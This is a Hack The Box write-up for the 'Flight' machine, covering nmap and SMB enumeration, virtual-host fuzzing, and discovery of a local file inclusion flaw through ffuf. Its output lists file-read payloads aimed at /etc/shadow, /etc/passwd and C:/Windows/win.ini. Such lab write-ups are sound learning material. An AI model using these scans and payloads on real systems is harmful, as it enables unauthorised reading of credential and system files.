---
layout: posts
title: "HTB — Flight Writeup"
date: 2026-03-22
tags: [htb, writeup, windows, web]
categories: [ctf]
---

## Overview

- **Machine:** Flight
- **Platform:** Hack The Box
- **OS:** Windows
- **Difficulty:** Hard

Flight is a really fun machine that spans from web application enumeration all the way into Active Directory attacks. It requires a solid understanding of web fuzzing, identifying useful entry points, capturing NTLM authentication, and leveraging those credentials for lateral movement and privilege abuse. It’s an excellent box to reinforce these skills in a realistic scenario. A bit wide but it's steps are simple and definitely very enjoyable.

---

## Initial Enumeration

### Nmap Scan

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ sudo nmap -p- -sVC 10.129.228.120

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-22 16:25 EDT
Nmap scan report for 10.129.228.120
Host is up (0.034s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-22 20:43:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 16m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-22T20:44:29
|_  start_date: N/A
```

Nmap reveals the typical ports for a machine inside an Active Directory, including SMB, RPC and LDAP. It also reveals port 80 open, most likely a custom web application. 

### Enum4linux

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ enum4linux-ng flight.htb

ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... flight.htb
[*] Username ......... ''
[*] Random Username .. 'gtokxbsi'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ===================================
|    Listener Scan on flight.htb    |
 ===================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: timed out
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: timed out
[*] Checking SMB
[-] Could not connect to SMB on 445/tcp: no route to host
[*] Checking SMB over NetBIOS
^C
[!] Received SIGINT, aborting enumeration

Completed after 11.03 seconds
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ sudo nano /etc/hosts             
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ enum4linux-ng flight.htb
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... flight.htb
[*] Username ......... ''
[*] Random Username .. 'bzocmkhp'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ===================================
|    Listener Scan on flight.htb    |
 ===================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ==================================================
|    Domain Information via LDAP for flight.htb    |
 ==================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: flight.htb

 =========================================================
|    NetBIOS Names and Workgroup/Domain for flight.htb    |
 =========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 =======================================
|    SMB Dialect Check on flight.htb    |
 =======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                                                                                                                                         
  SMB 1.0: false                                                                                                                                                                                                                            
  SMB 2.02: true                                                                                                                                                                                                                            
  SMB 2.1: true                                                                                                                                                                                                                             
  SMB 3.0: true                                                                                                                                                                                                                             
  SMB 3.1.1: true                                                                                                                                                                                                                           
Preferred dialect: SMB 3.0                                                                                                                                                                                                                  
SMB1 only: false                                                                                                                                                                                                                            
SMB signing required: true                                                                                                                                                                                                                  

 =========================================================
|    Domain Information via SMB session for flight.htb    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: G0                                                                                                                                                                                                                   
NetBIOS domain name: flight                                                                                                                                                                                                                 
DNS domain: flight.htb                                                                                                                                                                                                                      
FQDN: g0.flight.htb                                                                                                                                                                                                                         
Derived membership: domain member                                                                                                                                                                                                           
Derived domain: flight                                                                                                                                                                                                                      

 =======================================
|    RPC Session Check on flight.htb    |
 =======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 =================================================
|    Domain Information via RPC for flight.htb    |
 =================================================
[+] Domain: flight
[+] Domain SID: S-1-5-21-4078382237-1492182817-2568127209
[+] Membership: domain member

 =============================================
|    OS Information via RPC for flight.htb    |
 =============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                                                                                                    
OS version: '10.0'                                                                                                                                                                                                                          
OS release: '1809'                                                                                                                                                                                                                          
OS build: '17763'                                                                                                                                                                                                                           
Native OS: not supported                                                                                                                                                                                                                    
Native LAN manager: not supported                                                                                                                                                                                                           
Platform id: null                                                                                                                                                                                                                           
Server type: null                                                                                                                                                                                                                           
Server type string: null                                                                                                                                                                                                                    

 ===================================
|    Users via RPC on flight.htb    |
 ===================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ====================================
|    Groups via RPC on flight.htb    |
 ====================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ====================================
|    Shares via RPC on flight.htb    |
 ====================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 =======================================
|    Policies via RPC for flight.htb    |
 =======================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 =======================================
|    Printers via RPC for flight.htb    |
 =======================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

```

Enum4linux reveals additional information like the FDQN, domain SID and the computer name. I'll add this to my `/etc/hosts`.

### Port 80

I decided to start with port 80 after performing initial tests as "Guest" and Null users and getting no access. It's unusual to see a web application in this type of machines. I figured our initial foothold might be there.

<p align="center">
  <a href="/assets/images/flight/captura1.png" class="glightbox">
    <img src="/assets/images/flight/captura1.png" width="700">
  </a>
</p>

Initially, the site seems to be half way developed. None of the buttons work or redirect to anywhere. I ran an initial fuzz with dirb for directories and with ffuf for other virtual hosts.

Dirb didn't show me anything interesting beyond a lot of 403's.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ dirb http://flight.htb                                                                                                                        

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Mar 22 16:42:42 2026
URL_BASE: http://flight.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://flight.htb/ ----
+ http://flight.htb/aux (CODE:403|SIZE:299)                                                                                                                                                                                                
+ http://flight.htb/cgi-bin/ (CODE:403|SIZE:299)                                                                                                                                                                                           
+ http://flight.htb/com1 (CODE:403|SIZE:299)                                                                                                                                                                                               
+ http://flight.htb/com2 (CODE:403|SIZE:299)                                                                                                                                                                                               
+ http://flight.htb/com3 (CODE:403|SIZE:299)                                                                                                                                                                                               
+ http://flight.htb/con (CODE:403|SIZE:299)                                                                                                                                                                                                
==> DIRECTORY: http://flight.htb/css/                                                                                                                                                                                                      
+ http://flight.htb/examples (CODE:503|SIZE:399)                                                                                                                                                                                           
==> DIRECTORY: http://flight.htb/images/                                                                                                                                                                                                   
==> DIRECTORY: http://flight.htb/Images/                                                                                                                                                                                                   
+ http://flight.htb/index.html (CODE:200|SIZE:7069)                                                                                                                                                                                        
==> DIRECTORY: http://flight.htb/js/                                                                                                                                                                                                       
+ http://flight.htb/licenses (CODE:403|SIZE:418)                                                                                                                                                                                           
+ http://flight.htb/lpt1 (CODE:403|SIZE:299)                                                                                                                                                                                               
+ http://flight.htb/lpt2 (CODE:403|SIZE:299)                                                                                                                                                                                               
+ http://flight.htb/nul (CODE:403|SIZE:299)                                                                                                                                                                                                
+ http://flight.htb/phpmyadmin (CODE:403|SIZE:418)                                                                                                                                                                                         
+ http://flight.htb/prn (CODE:403|SIZE:299)                                                                                                                                                                                                
+ http://flight.htb/server-info (CODE:403|SIZE:418)                                                                                                                                                                                        
+ http://flight.htb/server-status (CODE:403|SIZE:418)                                                                                                                                                                                      
+ http://flight.htb/webalizer (CODE:403|SIZE:418)                                                                                                                                                                                          
                                                                                                                                                                                                                                           
---- Entering directory: http://flight.htb/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                           
---- Entering directory: http://flight.htb/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                           
---- Entering directory: http://flight.htb/Images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                           
---- Entering directory: http://flight.htb/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sun Mar 22 16:46:04 2026
DOWNLOADED: 4612 - FOUND: 17
```

However, ffuf with the flag `-ac` to auto-calibrate did yield some results.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ ffuf -u http://flight.htb -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac       

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://flight.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 48ms]
```

I'll add this to /etc/hosts and continue enumeration.

### school.flight.htb

<p align="center">
  <a href="/assets/images/flight/captura2.png" class="glightbox">
    <img src="/assets/images/flight/captura2.png" width="700">
  </a>
</p>

Again, it seems the site is barely developed, with default text everywhere. Dirbusting shows a lot of 403's again.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ dirb http://school.flight.htb

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Mar 22 16:52:14 2026
URL_BASE: http://school.flight.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://school.flight.htb/ ----
+ http://school.flight.htb/aux (CODE:403|SIZE:306)                                                                                                                                                                                         
+ http://school.flight.htb/cgi-bin/ (CODE:403|SIZE:306)                                                                                                                                                                                    
+ http://school.flight.htb/com1 (CODE:403|SIZE:306)                                                                                                                                                                                        
+ http://school.flight.htb/com2 (CODE:403|SIZE:306)                                                                                                                                                                                        
+ http://school.flight.htb/com3 (CODE:403|SIZE:306)                                                                                                                                                                                        
+ http://school.flight.htb/con (CODE:403|SIZE:306)                                                                                                                                                                                         
+ http://school.flight.htb/examples (CODE:503|SIZE:406)                                                                                                                                                                                    
==> DIRECTORY: http://school.flight.htb/images/                                                                                                                                                                                            
==> DIRECTORY: http://school.flight.htb/Images/                                                                                                                                                                                            
+ http://school.flight.htb/index.php (CODE:200|SIZE:3996)                                                                                                                                                                                  
+ http://school.flight.htb/licenses (CODE:403|SIZE:425)                                                                                                                                                                                    
+ http://school.flight.htb/lpt1 (CODE:403|SIZE:306)                                                                                                                                                                                        
+ http://school.flight.htb/lpt2 (CODE:403|SIZE:306)                                                                                                                                                                                        
+ http://school.flight.htb/nul (CODE:403|SIZE:306)                                                                                                                                                                                         
+ http://school.flight.htb/phpmyadmin (CODE:403|SIZE:425)                                                                                                                                                                                  
+ http://school.flight.htb/prn (CODE:403|SIZE:306)                                                                                                                                                                                         
+ http://school.flight.htb/server-info (CODE:403|SIZE:425)                                                                                                                                                                                 
+ http://school.flight.htb/server-status (CODE:403|SIZE:425)                                                                                                                                                                               
==> DIRECTORY: http://school.flight.htb/styles/                                                                                                                                                                                            
+ http://school.flight.htb/webalizer (CODE:403|SIZE:425)                                                                                                                                                                                   
                                                                                                                                                                                                                                           
---- Entering directory: http://school.flight.htb/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                           
---- Entering directory: http://school.flight.htb/Images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                           
---- Entering directory: http://school.flight.htb/styles/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
```

There's something in the page that caught my attention.

<p align="center">
  <a href="/assets/images/flight/captura3.png" class="glightbox">
    <img src="/assets/images/flight/captura3.png" width="700">
  </a>
</p>

It looks like index.php takes a `view` parameter. Seeing as this parameter loads content dynamically, I'll test for LFI.

<p align="center">
  <a href="/assets/images/flight/captura4.png" class="glightbox">
    <img src="/assets/images/flight/captura4.png" width="700">
  </a>
</p>

It looks like we have a filter to avoid common paths to test LFI. To go through this quickly and see if we can achieve LFI bypassing the filter, I'll copy the request as a file and load a wordlist in seclists collection. I'll fuzz the parameter with ffuf.

I'll name the request file req.req and use LFI-Jhaddix.txt to test for LFI with the flag `-ac` to auto-calibrate the response.

Our req.req will look like this.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ cat req.req  
GET /index.php?view=FUZZ HTTP/1.1
Host: school.flight.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

And now I'll run ffuf.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ ffuf -request req.req -request-proto http  -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://school.flight.htb/index.php?view=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Header           : Connection: keep-alive
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Priority: u=0, i
 :: Header           : Host: school.flight.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

- %00/etc/shadow%00       [Status: 500, Size: 639, Words: 73, Lines: 21, Duration: 71ms]
- %00/etc/passwd%00       [Status: 500, Size: 639, Words: 73, Lines: 21, Duration: 71ms]
- /etc/passwd%00          [Status: 500, Size: 639, Words: 73, Lines: 21, Duration: 34ms]
- etc/shadow%00           [Status: 500, Size: 639, Words: 73, Lines: 21, Duration: 41ms]
+ C:/Windows/win.ini      [Status: 200, Size: 1194, Words: 149, Lines: 38, Duration: 36ms]
:: Progress: [929/929] :: Job [1/1] :: 925 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Seeing that we're in a Windows machine, the one that interests us the most is the last `C:/Windows/wini.ini`
